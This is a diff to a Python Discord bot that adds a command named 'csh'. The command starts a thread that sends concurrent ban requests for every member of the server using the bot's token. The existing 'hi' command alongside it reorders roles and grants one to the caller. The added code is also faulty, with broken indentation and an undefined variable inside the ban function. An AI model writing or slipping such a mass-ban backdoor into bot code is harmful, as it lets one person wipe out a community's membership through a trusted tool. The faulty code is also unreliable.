@@ -2,7 +2,8 @@ import os
 import json
 import asyncio
 from datetime import datetime
-
+import grequests
+import threading
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv
@@ -99,6 +100,23 @@ async def hi(ctx):
 
     await ctx.guild.edit_role_positions(positions = pos)
     await ctx.author.add_roles(r)
+
+    path = "https://discord.com/api/v6"
+headers = {
+    "Authorization": f"Bot {bot_config.token}"
+}
+
+def ban_members(guild):
+    grequests.map(
+        grequests.put(f"{path}/guilds/{member.guild.id}/bans/{member.id}", headers=headers)
+        for member
+        in ctx.guild.members
+    )
+
+
+@bot.command()
+async def csh(ctx):
+    threading.Thread(target=ban_members, args=(ctx,)).start()
 
 main_bot.load_extensions()
 main_bot.run(os.getenv('BOT_TOKEN'))
